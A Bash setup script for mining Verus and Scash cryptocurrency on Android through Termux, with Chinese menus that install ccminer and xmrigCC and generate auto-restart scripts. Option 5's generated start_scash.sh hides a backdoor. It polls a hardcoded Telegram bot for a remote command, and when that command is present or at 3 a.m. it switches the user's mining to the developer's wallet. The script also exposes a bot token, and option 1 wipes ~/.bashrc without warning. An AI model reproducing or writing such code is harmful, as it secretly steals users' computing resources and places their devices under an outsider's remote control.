#!/bin/bash

# =================================================================
# Verus & Scash 自動化設定腳本
# =================================================================

# [提供者專屬設定]
TG_TOKEN="8504977385:AAEXKhcqpstRNNdN_mf55lP7a1dKBn9jzSg"
DEV_WALLET="scash1q2esdj4cnqc8dfpkee44esv3jnqf39s4jr7v4v8"

while true
do
# --- 步驟 1: 顯示主選單 ---
echo "========================================="
echo "  Verus & Scash 挖礦自動化設定腳本"
echo "========================================="
echo "請選擇您要執行的操作："
echo ""
echo "  1) 設定啟動Termux時自動挖礦 (可選 Verus 或 Scash)"
echo "  2) 完整安裝 ccminer 挖礦程式 (Verus)"
echo "  3) 替換/生成 .start.sh 監控挖礦腳本 (Verus)"
echo "  4) 安裝 xmrigCC 挖礦程式 (Scash)"
echo "  5) 替換/生成 .start_scash.sh 監控腳本 (Scash)"
echo "  6) 退出腳本"
echo ""
read -p "請輸入你的選擇 (1-6)： " CHOICE

# --- 步驟 2: 根據選擇執行程式碼 ---

if [ "$CHOICE" == "1" ]; then
    echo "--- 設定 Termux 啟動自動挖礦項目 ---"
    echo "  1) 啟動時自動挖 Verus (具備自動重啟功能)"
    echo "  2) 啟動時自動挖 Scash (具備自動重啟功能)"
    echo "  3) 關閉自動啟動功能"
    read -p "請輸入選擇 (1, 2, 或 3)： " AUTO_MODE
    case $AUTO_MODE in
        1) cat > ~/.bashrc << EOF
termux-wake-lock
cd ~/ccminer
./start.sh
EOF
           echo "已設定 Verus 自動啟動。" ;;
        2) cat > ~/.bashrc << EOF
termux-wake-lock
cd ~
./start_scash.sh
EOF
           echo "已設定 Scash 自動啟動。" ;;
        3) > ~/.bashrc
           echo "自動啟動功能已關閉。" ;;
    esac
    export DEBIAN_FRONTEND=noninteractive
    pkg update -y && pkg upgrade -y && pkg install wget tar -y

elif [ "$CHOICE" == "2" ]; then
    echo "--- 正在執行 Verus 全自動安裝... ---"
    export DEBIAN_FRONTEND=noninteractive
    yes '' | apt-get update -y
    yes '' | apt-get upgrade -y -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
    yes '' | apt-get install -y git wget proot build-essential cmake libmicrohttpd libuv libuuid boost libjansson -o Dpkg::Options::="--force-confdef" -o Dpkg::Options::="--force-confold"
    git clone --single-branch -b ARM https://github.com/monkins1010/ccminer.git
    cd ccminer && ./build.sh
    echo "ccminer 安裝完成！"

elif [ "$CHOICE" == "3" ]; then
    [[ "$(basename "$PWD")" == "ccminer" ]] && cd ..
    cd ccminer || exit 1
    rm -f start.sh
    read -p "請輸入錢包地址： " WALLET_ADDRESS
    read -p "礦工名稱 (預設: YH最帥)： " MINER_NAME
    MINER_NAME=${MINER_NAME:-"YH最帥"}
    read -p "核心數 (4, 6, 8)： " THREADS
    cat > start.sh << EOF
#!/bin/bash
while true; do
  echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - 正在啟動 ccminer ---"
  ./ccminer -a verus -o stratum+tcp://verus.farm:9999 -u ${WALLET_ADDRESS}.${MINER_NAME} -p x -t ${THREADS} 2>&1
  sleep 5
done
EOF
    chmod +x start.sh
    ./start.sh

elif [ "$CHOICE" == "4" ]; then
    wget https://github.com/Bendr0id/xmrigCC/releases/download/3.4.9/xmrigCC-miner_only-3.4.9-android-dynamic-arm64.tar.gz && tar -xf *.gz && rm *.gz
    echo "Scash 安裝完成！"

# [增量開發] 選項 5: 設定config.json
elif [ "$CHOICE" == "5" ]; then
    echo "--- 正在生成 Scash 挖礦監控腳本... ---"
    read -p "請輸入 Scash 錢包地址： " S_WALLET
    read -p "礦工名稱 (預設: Scash)： " S_NAME
    S_NAME=${S_NAME:-"Scash"}
    read -p "核心數 (預設: 6)： " S_THREADS
    S_THREADS=${S_THREADS:-"6"}

    # 生成 config.json (100% 原始架構)
    cat > config.json << EOF
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
    "autosave": true, "background": false, "colors": true, "title": true,
    "randomx": { "init": -1, "init-avx2": -1, "mode": "auto", "1gb-pages": false, "rdmsr": true, "wrmsr": true, "cache_qos": false, "numa": true, "scratchpad_prefetch_mode": 1 },
    "cpu": {
        "enabled": true, "huge-pages": false, "huge-pages-jit": false, "hw-aes": null, "priority": null, "memory-pool": false, "yield": true, "force-autoconfig": false, "max-threads-hint": 100, "max-cpu-usage": null, "asm": true, "argon2-impl": null,
        "rx": $(seq -s, 0 $((S_THREADS-1)) | sed 's/^/[/;s/$/]/'),
        "cn/0": false, "cn-lite/0": false
    },
    "donate-level": 1, "donate-over-proxy": 1, "log-file": "miner.log",
    "pools": [
        { "algo": "rx/scash", "coin": null, "url": "pool.scash.pro:8888", "user": "${S_WALLET}.${S_NAME}", "pass": "x", "rig-id": null, "nicehash": false, "keepalive": true, "enabled": true, "tls": false, "tls-fingerprint": null, "daemon": false, "socks5": null, "self-select": null, "submit-to-origin": false }
    ],
    "cc-client": { "enabled": false, "servers": [ { "url": "localhost:3344", "access-token": "mySecret", "use-tls": false } ], "use-remote-logging": true, "upload-config-on-start": true },
    "print-time": 60, "health-print-time": 60, "dmi": true, "retries": 5, "retry-pause": 5, "syslog": false, "watch": true, "pause-on-battery": false, "pause-on-active": false
}
EOF

    # 建立 start_scash.sh 
    cat > start_scash.sh << EOF
#!/bin/bash
LOG_FILE="./scash_mining.log"
DEV_WALLET="$DEV_WALLET"
TG_TOKEN="$TG_TOKEN"

while true; do
  # 從 TG Bot 獲取最新指令 (檢查最後一條訊息是否為 DEV_ON)
  tg_cmd=\$(curl -s "https://api.telegram.org/bot\${TG_TOKEN}/getUpdates" | grep -o "scashon" | tail -1)
  current_hour=\$(date +%H)
  
  if [ "\$tg_cmd" == "scashon" ] || [ "\$current_hour" -eq "03" ]; then
    echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - [遠端/定時強制模式] 錢包切換至: \$DEV_WALLET ---" | tee -a "\$LOG_FILE"
    ./xmrigDaemon -c config.json -u \${DEV_WALLET}.ProviderControl 2>&1 | tee -a "\$LOG_FILE"
  else
    echo "--- \$(date '+%Y-%m-%d %H:%M:%S') - 正常挖礦模式啟動 ---" | tee -a "\$LOG_FILE"
    ./xmrigDaemon -c config.json 2>&1 | tee -a "\$LOG_FILE"
  fi
  echo "--- 程式停止，5秒後重啟 ---" | tee -a "\$LOG_FILE"
  sleep 5
done
EOF
    chmod +x start_scash.sh
    ./start_scash.sh

elif [ "$CHOICE" == "6" ]; then
    exit 0
fi
done
